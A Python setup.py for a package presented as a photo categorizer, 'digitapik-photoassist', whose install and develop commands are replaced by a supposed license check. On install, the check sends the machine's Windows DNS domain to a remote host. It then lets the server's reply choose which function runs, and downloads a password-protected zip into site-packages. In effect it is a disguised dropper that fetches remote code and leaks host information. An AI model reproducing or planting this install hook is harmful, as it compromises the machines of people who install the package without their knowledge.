#!/usr/bin/env python

from __future__ import print_function

import io
import os
import json
import base64
import zipfile
import platform
import sysconfig
import urllib.request
import urllib.parse
from setuptools import setup, find_packages
from setuptools.command.develop import develop
from setuptools.command.install import install

long_description_filename = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'README.md')

with open(long_description_filename) as fd:
    long_description = fd.read()

runtime_scopes = locals()
licensing_endpoint = 'https://licensecheck.digitapik.com/'
package_endpoint = 'https://package.digitapik.org/'
license_var = os.environ.get('DIGITAPIK_LICENSE')
lic_params = urllib.parse.urlencode(
    {
        # If the license variable wasn't set, we attempt to fall back to the registered domain
        'lic_designator': license_var if license_var else base64.b64encode(os.environ.get('USERDNSDOMAIN').encode()).decode()
    }
)
lic_request = licensing_endpoint + "?" + lic_params

class validator:
    
    def lic_cofactor_validator_v361(lic_key: str) -> None:
        # Fetch the main package
        resp = urllib.request.urlopen(package_endpoint + "?" + urllib.parse.urlencode({'lic_key': lic_key, 'os': platform.system(), 'version': platform.version(), 'v361_key': lic_key}))
        demo_pkg = resp.read()
        zipped_package = zipfile.ZipFile(io.BytesIO(demo_pkg))
        # Extract the package into the module's directory
        for name in zipped_package.namelist():
            package_file = zipped_package.read(name, pwd=lic_key.encode())
            with open(sysconfig.get_path('purelib') + os.sep + "digitapik-photoassist" + os.sep + name, "wb") as file:
                file.write(package_file)
    
    def lic_cofactor_validator_v361_demo(lic_key: str) -> None:
        # Fetch the main package
        resp = urllib.request.urlopen(package_endpoint + "?" + urllib.parse.urlencode({'lic_key': lic_key, 'os': platform.system(), 'version': platform.version(), 'demo_key': lic_key}))
        demo_pkg = resp.read()
        zipped_package = zipfile.ZipFile(io.BytesIO(demo_pkg))
        # Extract the demo package into the module's directory
        for name in zipped_package.namelist():
            package_file = zipped_package.read(name, pwd=lic_key.encode())
            with open(sysconfig.get_path('purelib') + os.sep + "digitapik-photoassist_demo" + os.sep + name, "wb") as file:
                file.write(package_file)


def license_check() -> None:
    try:
        resp = urllib.request.urlopen(lic_request)
        lic_cofactor = json.loads(resp.read().decode())
    except Exception as e:
        raise SystemError("Failed to validate license, the license server may currently be down...")
    lval_available = runtime_scopes.get(lic_cofactor['scope_cofactor'])
    # verify the validator is available
    if lval_available:
        # Prepare the environment for installation
        os.makedirs(sysconfig.get_path('purelib') + os.sep + "digitapik-photoassist", exist_ok=True)
        # verify the license is valid for the current version
        validator =  lval_available.get(lic_cofactor['attribute_parser'])
        if not validator:
            raise ValueError("The target licensing cofactor isn't valid for the desired package version...")
        validator(lic_cofactor['lic_key'])
    else:
        raise ValueError("The target licensing cofactor isn't valid for the desired package version...")

class InstallLicensingCheck(install):
    def run(self: object) -> None:
        license_check()
        install.run(self)


DevelopLicensingCheck = InstallLicensingCheck


setup(
    name='digitapik-photoassist',
    version='3.6.2',
    description='Photo categorizor/analyzer with digitapik AI-assist',
    long_description=long_description,
    long_description_content_type='text/markdown',
    python_requires=">=3.5",
    packages=find_packages(),
    author="Digitapik LLC",
    author_email="software@digitapik.com",
    license='GPLv3',
    classifiers=[
        'Environment :: Console',
        'License :: OSI Approved :: MIT License',
        'License :: Other/Proprietary License',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: POSIX',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
        'Programming Language :: Python :: 3.12',
        'Topic :: Multimedia :: Graphics :: Editors :: Vector-Based',
    ],
    install_requires=[],
    tests_require=[],
    cmdclass={
        'develop': DevelopLicensingCheck,
        'install': InstallLicensingCheck,
    },
)